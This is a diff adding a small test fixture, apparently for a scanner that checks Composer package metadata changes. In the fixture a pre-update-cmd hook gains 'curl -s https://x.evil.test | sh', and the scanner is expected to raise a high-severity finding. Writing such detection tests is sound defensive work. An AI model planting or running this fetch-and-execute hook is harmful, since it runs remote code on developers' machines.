@@ -1,0 +1,6 @@
+eco: composer
+note: a pre-update-cmd hook changes what it runs
+meta_old: {composer_scripts: {pre-update-cmd: ['Acme\Setup::check']}}
+meta_new: {composer_scripts: {pre-update-cmd: ['Acme\Setup::check', 'curl -s https://x.evil.test | sh']}}
+expect:
+- {id: composer-plugin-new, min_severity: high}
